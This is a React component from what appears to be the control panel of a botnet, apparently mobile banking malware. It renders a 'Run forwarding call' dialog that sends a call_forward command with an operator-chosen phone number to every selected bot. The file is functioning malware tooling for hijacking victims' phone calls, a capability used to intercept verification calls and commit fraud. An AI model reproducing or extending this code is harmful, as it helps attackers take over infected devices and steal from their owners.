import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

//Переардесация звонка - {"this":"~command~","name":"forwardCall","number":"+123456789"}
class ForwardCall extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          phone: ''
        }
    }

    onChangePhone = (e) => {
        this.setState({ 
            phone: e.target.value.substring(0,40)
        });
    }

    onClickForwardCall = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"cmd":"call_forward","n":"' + this.state.phone + '"}');
            this.setState({ 
                phone: ''
            });
            try_eval('$.notify("Added command [call_forward]", "info");');
        }
    }

    render () {
        return (
            <React.Fragment>
                  <div class="modal fade" id="modalForwardingCall" tabindex="-1" role="dialog" aria-labelledby="modalForwardingCall" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Run forwarding call</h5>

                            <div class="modal-body">
                                <input class="form-control" value={this.state.phone} onChange={this.onChangePhone} placeholder="+16507598932" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickForwardCall} class="btn btn-outline-primary"  data-dismiss="modal">Run forwarding call</button>
                            </div>
                        </div>
                    </div>
                </div>
            </React.Fragment>
        );
    }
}

export default ForwardCall;